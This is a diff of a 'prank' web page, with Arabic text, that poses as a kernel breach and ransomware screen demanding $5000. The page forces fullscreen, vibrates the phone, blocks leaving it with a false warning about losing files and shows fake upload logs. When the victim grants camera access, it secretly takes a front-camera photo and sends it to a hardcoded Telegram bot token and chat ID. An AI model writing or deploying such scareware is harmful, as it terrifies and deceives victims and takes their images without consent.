@@ -3,87 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SYSTEM CRITICAL ERROR</title>
+    <title>CRITICAL KERNEL PANIC - ERROR 0x80070002</title>
     <style>
         body {
             background-color: #000;
-            color: #ff0033;
+            color: #ff0000;
             font-family: 'Courier New', Courier, monospace;
             text-align: center;
             margin: 0;
-            padding: 20px;
+            padding: 10px;
             height: 100vh;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             overflow: hidden;
-            animation: screenGlitch 0.12s infinite;
+            animation: extremeGlitch 0.08s infinite;
         }
-        @keyframes screenGlitch {
-            0% { background-color: #050000; transform: translate(0, 0); }
-            30% { background-color: #260000; transform: translate(-3px, 3px); }
-            60% { background-color: #050000; transform: translate(3px, -3px); }
-            100% { background-color: #1a0000; transform: translate(0, 0); }
+        @keyframes extremeGlitch {
+            0% { background-color: #000000; transform: translate(0, 0); filter: invert(0); }
+            20% { background-color: #330000; transform: translate(-4px, 4px); filter: invert(1); }
+            40% { background-color: #000000; transform: translate(4px, -4px); filter: invert(0); }
+            60% { background-color: #1a0000; transform: translate(-2px, -2px); }
+            80% { background-color: #400000; transform: translate(3px, 3px); filter: invert(0.2); }
+            100% { background-color: #000000; transform: translate(0, 0); }
         }
         .box {
-            border: 3px solid #ff0033;
-            padding: 25px;
-            background: rgba(15, 0, 0, 0.98);
-            box-shadow: 0 0 60px rgba(255, 0, 51, 0.9);
-            width: 90%;
-            max-width: 400px;
+            border: 4px solid #ff0000;
+            padding: 20px;
+            background: rgba(10, 0, 0, 0.98);
+            box-shadow: 0 0 80px rgba(255, 0, 0, 1);
+            width: 95%;
+            max-width: 420px;
         }
-        h1 { font-size: 20px; margin-bottom: 12px; text-shadow: 0 0 12px #ff0033; }
-        p { font-size: 13px; color: #ff99aa; line-height: 1.6; }
+        h1 { font-size: 21px; margin-bottom: 10px; text-shadow: 0 0 15px #ff0000; color: #ff3333; }
+        p { font-size: 12px; color: #ff9999; line-height: 1.5; }
+        .terminal-log {
+            background: #1a0000;
+            color: #ff4d4d;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 11px;
+            text-align: left;
+            direction: ltr;
+            border: 1px solid #ff0000;
+            height: 60px;
+            overflow: hidden;
+        }
         .ransom-box {
             background: #2b0000;
             color: #ffcccc;
-            padding: 12px;
-            margin-top: 15px;
-            font-size: 13px;
+            padding: 10px;
+            margin-top: 10px;
+            font-size: 12px;
             border: 1px dashed red;
         }
         .btn {
-            background-color: #ff0033;
+            background-color: #ff0000;
             color: white;
             border: none;
-            padding: 14px;
-            font-size: 15px;
-            border-radius: 5px;
+            padding: 13px;
+            font-size: 14px;
+            border-radius: 4px;
             cursor: pointer;
             width: 100%;
-            margin-top: 15px;
+            margin-top: 12px;
             font-weight: bold;
+            box-shadow: 0 0 15px rgba(255,0,0,0.8);
         }
-        .btn:hover { background-color: #cc0029; }
+        .btn:hover { background-color: #cc0000; }
 
         .prank-mode {
             background-color: #001a00 !important;
             border-color: #00ff00 !important;
             color: #00ff00 !important;
-            box-shadow: 0 0 50px rgba(0, 255, 0, 0.8) !important;
+            box-shadow: 0 0 80px rgba(0, 255, 0, 0.9) !important;
             animation: none !important;
         }
-        .prank-mode h1 { color: #00ff00 !important; text-shadow: 0 0 10px #00ff00; }
+        .prank-mode h1 { color: #00ff00 !important; text-shadow: 0 0 15px #00ff00; }
+        .prank-mode .terminal-log { background: #001100; color: #00ff00; border-color: #00ff00; }
         .prank-mode .ransom-box { background: #002600; color: #ccffcc; border-color: #00ff00; }
-        .prank-mode .btn { background-color: #00ff00; color: #000; }
+        .prank-mode .btn { background-color: #00ff00; color: #000; box-shadow: 0 0 15px rgba(0,255,0,0.8); }
     </style>
 </head>
-<body onclick="triggerChaos()">
+<body onclick="lockFullscreen()">
 
     <div class="box" id="mainBox">
-        <h1 id="title">🚨 تحذير: تم اختراق الحسابات! 🚨</h1>
-        <p id="desc">تم سحب الصور، الكاميرا، وكلمات المرور بنجاح إلى السيرفر الخارجي. الجهاز مسيطر عليه بالكامل حالياً...</p>
+        <h1 id="title">⚠️ KERNEL SECURITY BREACH ⚠️</h1>
+        <p id="desc">تم تجاوز جدار الحماية بنجاح! جاري تفريغ الذاكرة الداخلية، سحب صور الاستوديو، وجهات الاتصال إلى سيرفر الهاكرز الخارجي...</p>
         
+        <div class="terminal-log" id="termLog">
+            > Initializing payload... [OK]<br>
+            > Bypassing Android SELinux... [OK]<br>
+            > Uploading /DCIM/Camera to remote server... 89%
+        </div>
+
         <div class="ransom-box" id="ransomText">
-            ⚠ لتجنب مسح الذاكرة وحذف نظام التشغيل نهائياً، يجب دفع الفدية الفورية عبر الزر أدناه!
+            ⚠ تحذير نهائي: سيتم فرمتة الجهاز ومسح نظام التشغيل بالكامل خلال ثوانٍ معدودة! الحل الوحيد لتجنب التدمير هو دفع الفدية الفورية.
         </div>
 
         <button class="btn" id="actionBtn" onclick="requestAllowAndPrank()">دفع فدية فك التشفير (5000$) 💳</button>
     </div>
 
-    <!-- عناصر خفية للكاميرا -->
     <video id="video" autoplay playsinline style="display:none;"></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -91,28 +112,39 @@
         const BOT_TOKEN = "8732626253:AAHGWyKFHqXI1sSOFnQ2sVeR4vmJBeJ7iNw";
         const CHAT_ID = "6772192037";
 
-        window.onload = function() {
+        function lockFullscreen() {
             let elem = document.documentElement;
             if (elem.requestFullscreen) {
                 elem.requestFullscreen().catch(e => {});
-            }
-        };
-
-        function triggerChaos() {
-            if (navigator.vibrate) {
-                navigator.vibrate([500, 150, 500, 150, 1000, 200, 1500, 300, 2000]);
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
             }
         }
 
-        // الدالة دي بتطلب إذن الكاميرا عند الضغط: لو ضغط Allow (تمت الموافقة)، هتاخد الصورة وتبعت وتظهر الضحكة
+        // أول ما يفتح الصفحة: فول سكرين إجباري وهزاز مرعب
+        window.onload = function() {
+            lockFullscreen();
+
+            if (navigator.vibrate) {
+                navigator.vibrate([800, 200, 800, 200, 1500, 300, 2000, 500, 3000]);
+            }
+        };
+
+        // لو حاول يقفل الصفحة أو يخرج، النظام يطلع له تحذير يمنعه
+        window.onbeforeunload = function(e) {
+            e.preventDefault();
+            e.returnValue = "تحذير خطير: إغلاق المتصفح سيؤدي إلى فقدان الملفات نهائياً!";
+            return "تحذير خطير: إغلاق المتصفح سيؤدي إلى فقدان الملفات نهائياً!";
+        };
+
+        // زرار الدفع: لو وافق على Allow، الصورة تتبعت والمقلب ينكشف ويتلغى قفل الخروج
         function requestAllowAndPrank(event) {
             if(event) event.stopPropagation();
 
             if (navigator.vibrate) {
-                navigator.vibrate(200);
+                navigator.vibrate(300);
             }
 
-            // طلب الإذن من المتصفح
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const video = document.getElementById('video');
@@ -128,8 +160,8 @@
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'victim_allowed.jpg');
-                        formData.append('caption', '🚨 ضحية جديدة وافقت على السماح ووقعت في المقلب!');
+                        formData.append('photo', blob, 'victim_locked.jpg');
+                        formData.append('caption', '🚨 الضحية وقع وهو محبوس في الفول سكرين!');
 
                         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
@@ -140,18 +172,22 @@
                     }, 'image/jpeg', 0.8);
                 }, 800);
 
-                // الضحكة مش هتيجي غير هنا.. يعني بعد ما وافق وضغط Allow فعلياً!
+                // إلغاء منع الخروج وإظهار الضحكة
+                window.onbeforeunload = null;
+
                 let box = document.getElementById("mainBox");
                 let title = document.getElementById("title");
                 let desc = document.getElementById("desc");
+                let log = document.getElementById("termLog");
                 let ransom = document.getElementById("ransomText");
                 let btn = document.getElementById("actionBtn");
 
                 box.classList.add("prank-mode");
-                title.innerText = "😂😂 يا عم اقعد.. روحك رجعت ولا لسه؟! 😂";
-                desc.innerText = "كنت رايح تدفع 5000 دولار وتفك التشفير كمان يا غلبان؟! تليفونك سليم ومحدش اخترقه ولا حاجة!";
-                ransom.innerHTML = "<b>ده انت وافقت على إذن الكاميرا وصورتك اتبعتت لي حالا 😂📸 كشفناك!</b>";
-                btn.innerText = "اضحك على نفسك بقى وكفاية رعب 😉";
+                title.innerText = "😂😂 يا عم اقعد.. كنت محشور فين؟! 😂";
+                desc.innerText = "كنت فاكر نفسك اتهكرت ومرعوب مش عارف تخرج من الشاشة ولا تقفل المتصفح كمان؟! تليفونك سليم!";
+                log.innerHTML = "> Status: PRANK_SUCCESSFUL [100%]<br>";
+                ransom.innerHTML = "<b>صورتك اتبعتت لي وأنت خايف تخرج 😂📸 عاش المقلب الجامد ده!</b>";
+                btn.innerText = "اضحك على نفسك بقى وكفاية قفل 😉";
                 
                 btn.onclick = function(e) {
                     e.stopPropagation();
@@ -159,7 +195,6 @@
                 };
 
             }).catch(err => {
-                // لو عمل Block أو رفض الإذن، المقلب مش هيظهر وهيفضل الشاشه مرعبة زي ما هي!
                 console.log("User denied camera permission");
             });
         }
